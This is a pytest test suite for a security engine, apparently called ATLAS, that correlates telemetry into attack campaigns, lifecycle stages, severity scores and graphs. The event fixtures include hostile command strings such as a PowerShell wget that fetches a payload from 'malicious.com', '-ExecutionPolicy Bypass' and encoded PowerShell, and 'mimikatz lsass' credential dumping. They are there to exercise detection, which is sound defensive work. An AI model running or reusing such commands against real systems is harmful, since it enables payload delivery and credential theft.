"""
Comprehensive Test Suite for ATLAS Campaign Intelligence & Behavioral Correlation Engine.
Validates behavioral correlation, unknown campaign discovery, explainable confidence/severity,
relationship graphs, analyst validation, and LIVE/SCENARIO segregation.
"""

import pytest
import sqlite3
import database
from campaign_engine import CampaignEngine, Campaign, Attribution
from knowledge_base.knowledge_base import get_knowledge_base


@pytest.fixture(autouse=True)
def setup_db():
    database.init_db()


def test_1_correlation_unknown_campaign():
    engine = CampaignEngine()
    events = [
        {"event_id": "e1", "src_ip": "192.168.1.100", "dst_ip": "10.0.0.1", "dst_port": 22, "event_type": "network", "command": "ssh", "source_mode": "LIVE"},
        {"event_id": "e2", "src_ip": "192.168.1.100", "dst_ip": "10.0.0.1", "dst_port": 22, "event_type": "authentication", "command": "brute_force", "source_mode": "LIVE"},
        {"event_id": "e3", "src_ip": "192.168.1.100", "dst_ip": "10.0.0.1", "dst_port": 22, "event_type": "process", "command": "powershell.exe -ExecutionPolicy Bypass", "source_mode": "LIVE"}
    ]

    camps = engine.correlate_telemetry(events, source_mode="LIVE")
    assert len(camps) == 1
    c = camps[0]

    assert c.campaign_type == "BEHAVIORAL"
    assert c.status == "ACTIVE"
    assert c.source_mode == "LIVE"
    assert c.attribution.type == "UNKNOWN"
    assert c.attribution.name is None
    assert "UNKNOWN BEHAVIORAL CAMPAIGN" in c.campaign_name
    assert c.analyst_status == "UNVALIDATED"


def test_2_behavioral_fingerprint():
    engine = CampaignEngine()
    events = [
        {"event_type": "network", "protocol": "TCP", "dst_port": 443},
        {"event_type": "process", "command": "powershell wget http://malicious.com/payload.exe"},
        {"event_type": "file", "command": "write payload.exe"}
    ]

    fp = engine.extract_behavior_fingerprint(events)
    assert "TCP" in fp["protocols"]
    assert 443 in fp["ports"]
    assert fp["payload_delivery"] is True
    assert fp["execution"] is True


def test_3_lifecycle_progression():
    engine = CampaignEngine()
    events = [
        {"event_type": "network", "command": "scan"},
        {"event_type": "authentication", "command": "ssh login"},
        {"event_type": "process", "command": "whoami"},
        {"event_type": "process", "command": "mimikatz lsass"}
    ]

    stages = engine.evaluate_lifecycle_stages(events)
    assert "RECONNAISSANCE" in stages
    assert "INITIAL_ACCESS" in stages
    assert "EXECUTION" in stages
    assert "DISCOVERY" in stages
    assert "CREDENTIAL_ACCESS" in stages


def test_4_explainable_confidence_severity():
    engine = CampaignEngine()
    events = [
        {"event_id": "e1", "source": "ProcessCollector", "event_type": "process", "command": "powershell -enc AAAA"},
        {"event_id": "e2", "source": "ProcessCollector", "event_type": "process", "command": "mimikatz lsass"}
    ]

    conf, conf_reasons = engine.calculate_confidence(events, ["192.168.1.10"], ["T1059.001", "T1003.001"])
    assert conf >= 0.70
    assert any("+ Multi-stage MITRE ATT&CK" in r for r in conf_reasons)
    assert any("- No external threat actor" in r for r in conf_reasons)

    sev, sev_reasons = engine.calculate_severity(events, ["EXECUTION", "CREDENTIAL_ACCESS"])
    assert sev == "CRITICAL"
    assert any("Credential dumping payload" in r for r in sev_reasons)


def test_5_database_persistence_and_query():
    engine = CampaignEngine()
    events = [
        {"event_id": "db-e1", "src_ip": "10.0.0.50", "dst_ip": "192.168.1.1", "dst_port": 80, "event_type": "network", "command": "curl http://test.com", "source_mode": "LIVE"}
    ]

    camps = engine.correlate_telemetry(events, source_mode="LIVE")
    for c in camps:
        database.save_campaign(c.to_dict())

    retrieved = database.get_campaigns(source_mode="LIVE")
    assert len(retrieved) >= 1
    found = database.get_campaign_by_id(camps[0].campaign_id)
    assert found is not None
    assert found["campaign_id"] == camps[0].campaign_id


def test_6_analyst_validation_pipeline():
    engine = CampaignEngine()
    events = [
        {"event_id": "val-e1", "src_ip": "172.16.0.5", "dst_ip": "192.168.1.1", "dst_port": 443, "event_type": "process", "command": "powershell", "source_mode": "LIVE"}
    ]

    camps = engine.correlate_telemetry(events, source_mode="LIVE")
    c_dict = camps[0].to_dict()
    database.save_campaign(c_dict)

    # Initial state
    assert c_dict["analyst_status"] == "UNVALIDATED"

    # Analyst Validates
    updated = database.update_campaign_analyst_status(c_dict["campaign_id"], "VALIDATED", actor="Analyst_John", notes="Verified attack sequence")
    assert updated["analyst_status"] == "VALIDATED"
    assert len(updated["audit_trail"]) >= 2

    # Verify Knowledge Base memory insertion
    kb = get_knowledge_base()
    kb_id = kb.add_validated_campaign_memory(updated)
    assert kb_id == c_dict["campaign_id"]
    assert c_dict["campaign_id"] in kb.campaigns


def test_7_relationship_graph_generation():
    engine = CampaignEngine()
    camp_dict = {
        "campaign_id": "CMP-TEST-0001",
        "campaign_name": "Test Campaign",
        "severity": "HIGH",
        "source_ips": ["192.168.1.100"],
        "destination_ips": ["10.0.0.1"],
        "hosts": ["WK-902"],
        "technique_ids": ["T1059.001"]
    }

    graph = engine.generate_relationship_graph(camp_dict)
    assert "nodes" in graph
    assert "edges" in graph
    assert len(graph["nodes"]) == 5  # 1 campaign + 1 src_ip + 1 dst_ip + 1 host + 1 technique
    assert len(graph["edges"]) == 4


def test_8_scenario_campaign_generation():
    engine = CampaignEngine()
    scen_camps = engine.generate_scenario_campaigns("SSH_BRUTEFORCE")
    assert len(scen_camps) == 1
    c = scen_camps[0]

    assert c.source_mode == "SCENARIO"
    assert c.attribution.type == "UNKNOWN"
    assert "CMP-SCEN" in c.campaign_id


def test_9_live_vs_scenario_segregation():
    engine = CampaignEngine()
    live_events = [{"event_id": "l1", "src_ip": "1.1.1.1", "source_mode": "LIVE"}]
    scen_events = [{"event_id": "s1", "src_ip": "2.2.2.2", "source_mode": "SCENARIO"}]

    live_camps = engine.correlate_telemetry(live_events, source_mode="LIVE")
    scen_camps = engine.correlate_telemetry(scen_events, source_mode="SCENARIO")

    assert all(c.source_mode == "LIVE" for c in live_camps)
    assert all(c.source_mode == "SCENARIO" for c in scen_camps)


def test_10_benign_baseline_no_campaign():
    engine = CampaignEngine()
    scen_camps = engine.generate_scenario_campaigns("BENIGN_BASELINE")
    assert len(scen_camps) == 0


def test_11_attack_sessions_building():
    engine = CampaignEngine()
    events = [
        {"event_id": "e1", "src_ip": "1.1.1.1", "dst_port": 22, "event_type": "network", "source_mode": "LIVE"},
        {"event_id": "e2", "src_ip": "1.1.1.1", "dst_port": 22, "event_type": "authentication", "source_mode": "LIVE"},
        {"event_id": "e3", "src_ip": "2.2.2.2", "dst_port": 80, "event_type": "network", "source_mode": "LIVE"}
    ]

    sessions = engine.build_attack_sessions(events, source_mode="LIVE")
    assert len(sessions) == 2
    ip1_sess = [s for s in sessions if s.source_ip == "1.1.1.1"][0]
    assert len(ip1_sess.events) == 2
    assert ip1_sess.target_ports == [22]


def test_12_false_correlation_prevention():
    engine = CampaignEngine()
    events = [
        {"event_id": "e1", "src_ip": "10.0.0.1", "dst_port": 80, "event_type": "network", "command": "routine_http", "source_mode": "LIVE"},
        {"event_id": "e2", "src_ip": "10.0.0.2", "dst_port": 443, "event_type": "dns", "command": "query_github", "source_mode": "LIVE"},
        {"event_id": "e3", "src_ip": "10.0.0.3", "dst_port": 123, "event_type": "network", "command": "ntp_sync", "source_mode": "LIVE"}
    ]

    camps = engine.correlate_telemetry(events, source_mode="LIVE")
    assert len(camps) == 0
